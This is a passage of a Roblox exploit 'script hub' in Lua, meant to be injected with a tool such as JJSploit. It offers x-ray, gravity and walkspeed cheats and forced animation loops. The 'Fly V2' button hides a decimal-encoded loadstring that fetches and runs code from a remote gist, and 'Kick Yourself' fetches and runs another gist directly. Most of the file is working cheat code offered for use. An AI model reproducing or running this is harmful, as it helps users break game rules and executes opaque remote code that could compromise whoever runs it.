		camera.CFrame = camera.CFrame * ENABLED_OFFSET
	end
	local function DisableShiftlock()
		UpdateAutoRotate(true)
		UpdateImage("OFF")
		camera.CFrame = camera.CFrame * DISABLED_OFFSET
		pcall(function()
			active:Disconnect()
			active = nil
		end)
	end
	UpdateImage("OFF")
	active = false
	function ShiftLock()
		if not active then
			active = runservice.RenderStepped:Connect(function()
				EnableShiftlock()
			end)
		else
			DisableShiftlock()
		end
	end
	local ShiftLockButton = CAS:BindAction("ShiftLOCK", ShiftLock, false, "On")
	CAS:SetPosition("ShiftLOCK", UDim2.new(0.8, 0, 0.8, 0))
	button.MouseButton1Click:Connect(function()
		if not active then
			active = runservice.RenderStepped:Connect(function()
				EnableShiftlock()
			end)
		else
			DisableShiftlock()
		end
	end)
	return MobileCameraFramework
	
end
coroutine.wrap(TLQOYN_fake_script)()
local function OMQRQRC_fake_script() -- ShiftlockStarterGui.LocalScript 
	local script = Instance.new('LocalScript', ShiftlockStarterGui)

	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	local Settings = UserSettings()
	local GameSettings = Settings.GameSettings
	local ShiftLockController = {}
	while not Players.LocalPlayer do
		wait()
	end
	local LocalPlayer = Players.LocalPlayer
	local Mouse = LocalPlayer:GetMouse()
	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
	local ScreenGui, ShiftLockIcon, InputCn
	local IsShiftLockMode = true
	local IsShiftLocked = true
	local IsActionBound = false
	local IsInFirstPerson = false
	ShiftLockController.OnShiftLockToggled = Instance.new("BindableEvent")
	local function isShiftLockMode()
		return LocalPlayer.DevEnableMouseLock and GameSettings.ControlMode == Enum.ControlMode.MouseLockSwitch and LocalPlayer.DevComputerMovementMode ~= Enum.DevComputerMovementMode.ClickToMove and GameSettings.ComputerMovementMode ~= Enum.ComputerMovementMode.ClickToMove and LocalPlayer.DevComputerMovementMode ~= Enum.DevComputerMovementMode.Scriptable
	end
	if not UserInputService.TouchEnabled then
		IsShiftLockMode = isShiftLockMode()
	end
	local function onShiftLockToggled()
		IsShiftLocked = not IsShiftLocked
		ShiftLockController.OnShiftLockToggled:Fire()
	end
	local initialize = function()
		print("enabled")
	end
	function ShiftLockController:IsShiftLocked()
		return IsShiftLockMode and IsShiftLocked
	end
	function ShiftLockController:SetIsInFirstPerson(isInFirstPerson)
		IsInFirstPerson = isInFirstPerson
	end
	local function mouseLockSwitchFunc(actionName, inputState, inputObject)
		if IsShiftLockMode then
			onShiftLockToggled()
		end
	end
	local function disableShiftLock()
		if ScreenGui then
			ScreenGui.Parent = nil
		end
		IsShiftLockMode = false
		Mouse.Icon = ""
		if InputCn then
			InputCn:disconnect()
			InputCn = nil
		end
		IsActionBound = false
		ShiftLockController.OnShiftLockToggled:Fire()
	end
	local onShiftInputBegan = function(inputObject, isProcessed)
		if isProcessed then
			return
		end
		if inputObject.UserInputType ~= Enum.UserInputType.Keyboard or inputObject.KeyCode == Enum.KeyCode.LeftShift or inputObject.KeyCode == Enum.KeyCode.RightShift then
		end
	end
	local function enableShiftLock()
		IsShiftLockMode = isShiftLockMode()
		if IsShiftLockMode then
			if ScreenGui then
				ScreenGui.Parent = PlayerGui
			end
			if IsShiftLocked then
				ShiftLockController.OnShiftLockToggled:Fire()
			end
			if not IsActionBound then
				InputCn = UserInputService.InputBegan:connect(onShiftInputBegan)
				IsActionBound = true
			end
		end
	end
	GameSettings.Changed:connect(function(property)
		if property == "ControlMode" then
			if GameSettings.ControlMode == Enum.ControlMode.MouseLockSwitch then
				enableShiftLock()
			else
				disableShiftLock()
			end
		elseif property == "ComputerMovementMode" then
			if GameSettings.ComputerMovementMode == Enum.ComputerMovementMode.ClickToMove then
				disableShiftLock()
			else
				enableShiftLock()
			end
		end
	end)
	LocalPlayer.Changed:connect(function(property)
		if property == "DevEnableMouseLock" then
			if LocalPlayer.DevEnableMouseLock then
				enableShiftLock()
			else
				disableShiftLock()
			end
		elseif property == "DevComputerMovementMode" then
			if LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.ClickToMove or LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.Scriptable then
				disableShiftLock()
			else
				enableShiftLock()
			end
		end
	end)
	LocalPlayer.CharacterAdded:connect(function(character)
		if not UserInputService.TouchEnabled then
			initialize()
		end
	end)
	if not UserInputService.TouchEnabled then
		initialize()
		if isShiftLockMode() then
			InputCn = UserInputService.InputBegan:connect(onShiftInputBegan)
			IsActionBound = true
		end
	end
	enableShiftLock()
	return ShiftLockController
	
end
coroutine.wrap(OMQRQRC_fake_script)()
end)

Section:NewButton("Xray(Need Keyboard and press E)", "WallXray lol", function()
local xrayHotkey = Enum.KeyCode.E                                                                 

local uis = game:GetService("UserInputService")


local xrayOn = false


uis.InputBegan:Connect(function(inp, processed)
	
	
	if processed then return end
	
	
	if inp.KeyCode == xrayHotkey then
		
		
		xrayOn = not xrayOn
		
		
		for i, descendant in pairs(workspace:GetDescendants()) do
				
			if descendant:IsA("BasePart") then
				
				if xrayOn then
					
					if not descendant:FindFirstChild("OriginalTransparency") then
						
						local originalTransparency = Instance.new("NumberValue")
						originalTransparency.Name = "OriginalTransparency"
						originalTransparency.Value = descendant.Transparency
						originalTransparency.Parent = descendant
					end
					
					descendant.Transparency = 0.5
					
				else
					descendant.Transparency = descendant.OriginalTransparency.Value
				end
			end
		end
	end
end)
end)





local Section = Tab:NewSection("R15 Animation")

Section:NewButton("Zombie Animation", "R15 animation", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
game.Players.LocalPlayer.Character.Humanoid.Jump = false
    end
end
end)
Section:NewButton("Cartoony Animation", "R15 animation", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
game.Players.LocalPlayer.Character.Humanoid.Jump = false
    end
end
end)

Section:NewButton("Astronaut", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
game.Players.LocalPlayer.Character.Humanoid.Jump = false
     end
end
end)

Section:NewButton("Bubbly", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
game.Players.LocalPlayer.Character.Humanoid.Jump = false
     end
end
end)

Section:NewButton("Elder", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end) 

Section:NewButton("Knight", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end 
end)

Section:NewButton("Levitation", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Mage", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)
Section:NewButton("Ninja", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Pirate", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Robot", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Stylish", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("SuperHero", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end 
end 
end)

Section:NewButton("Toy", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Vampire", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Werewolf", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Patrol", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Confident", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Ghost", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616012453"
Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616011509"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Sneaky", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616012453"
Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616011509"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Princess", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("No Animation", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=0"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Athro", "local script", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
    game.Players.LocalPlayer.Character.Humanoid.Jump = false
end
end
end)

Section:NewButton("Gravity (Need Keyboard And Press E)", "Moon Jump lol", function()
--[[
A distribution of Andrheyplayz_Officalyt
June 13, 2020

Simply inject this script into any game using a Lua injector like JJSploit
then press e while in game to turn gravity on and off. 
]]

if _G.WRDGravitySwitchStarted == nil then
	_G.WRDGravitySwitchStarted = true
	
	--Gets the player's mouse
	local mouse = game:GetService("Players").LocalPlayer:GetMouse()

	--Waits until the player's mouse is found
	repeat wait() until mouse

	--Toggles
	mouse.KeyDown:connect(function(key)
		if key:lower() == "e" then
			if workspace.Gravity > 0 then
				--Turns off gravity
				workspace.Gravity = 0
				game.StarterGui:SetCore("SendNotification", {Title="Zero Gravity"; Text="Andrheyplayz_officalyt"; Duration=1;})
			else 
				--Reset to default
				workspace.Gravity = 196.2
				game.StarterGui:SetCore("SendNotification", {Title="Normal Gravity"; Text="Andrheyplayz_officalyt"; Duration=1;})
			end
		end
	end)
end

game.StarterGui:SetCore("SendNotification", {Title="Andrheyplayz_officalyt"; Text="The Gravity Switch exploit is ready!\nPress \"e\" to toggle"; Duration=5;})
end)



local Section = Tab:NewSection("For Games")

Section:NewButton("Fly V2", "Makes you Fly", function()
 loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end)

Section:NewButton("Walkspeed", "increases your Walkspeed", function()
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50  --Normal 33--
end)

Section:NewButton("Kick Yourself", "Kick yourself emergencys only", function()
      loadstring(game:HttpGet("https://gist.githubusercontent.com/testttbqwebg/adc0db730f5dfca0d8dbdb81f3b65391/raw/b0443888c4399af5a297cb1100a4749c65705711/qweqw", true))()
end)




local Tab = Window:NewTab("Credits")
local Section = Tab:NewSection("Team: YellowGreg, WspBoy12, MMSVon, vandamcruzz")
local Section = Tab:NewSection("Credit To Owner Who made the Script")
local Section = Tab:NewSection("Credit To Kavo Ui for The Gui")
local Section = Tab:NewSection("Join Our Discord if you found any bug")
local Section = Tab:NewSection("Join Our discord if you found any script not working")

Section:NewButton("Copy Discord link", "Discord", function()
setclipboard("https://discord.gg/fKDX7jwj5M")
end)

--Moving Tab--
Frame.Parent.Active = true
Frame.Parent.Draggable = true













--end--
